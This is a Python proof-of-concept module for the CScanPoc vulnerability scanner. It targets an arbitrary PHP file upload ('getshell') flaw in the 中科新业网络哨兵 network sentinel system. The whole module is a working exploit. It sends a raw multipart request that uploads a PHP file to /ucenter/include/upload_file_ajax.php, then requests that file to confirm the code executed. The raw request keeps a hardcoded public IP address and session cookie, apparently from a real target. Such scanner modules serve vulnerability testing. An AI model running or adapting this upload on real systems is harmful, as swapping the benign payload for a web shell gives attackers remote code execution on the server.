# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'seentech_0001'  # 平台漏洞编号，留空
    name = '中科新业网络哨兵任意文件上传getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-04-20'  # 漏洞公布时间
    desc = '''
        中科新业网络哨兵系统 /ucenter/include/upload_file_ajax.php 页面任意文件上传。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0108640'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '中科新业网络哨兵'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '19417df3-a55c-46f2-a257-e57f4d987847'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # link：http://wooyun.org/bugs/wooyun-2010-0108640
            hh = hackhttp.hackhttp()
            raw = """
POST /ucenter/include/upload_file_ajax.php HTTP/1.1
Host: 60.223.226.154
Connection: keep-alive
Content-Length: 353
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/44.0.2403.89 Chrome/44.0.2403.89 Safari/537.36
HTTPS: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjIEtCXPH57DBttu6
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=153d91c04992e4c54b7ff8f2f5414c63

------WebKitFormBoundaryjIEtCXPH57DBttu6
Content-Disposition: form-data; name="file"; filename="3.php"
Content-Type: application/x-php

<?php
echo md5('testvul');
unlink($GLOBALS['SCRIPT_FILENAME']);
?>
------WebKitFormBoundaryjIEtCXPH57DBttu6
Content-Disposition: form-data; name="fileframe"

aaaa
------WebKitFormBoundaryjIEtCXPH57DBttu6--
"""

            url1 = self.target + '/include/upload_file_ajax.php'
            code, head, res, errcode, _ = hh.http(url1, raw=raw)
            url2 = self.target + '/include/3.php'
            code, head, res, errcode, _ = hh.http(url2)

            if code == 200 and 'e87ebbaed6f97f26e222e030eddbad1c' in res:
                # security_hole(url1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
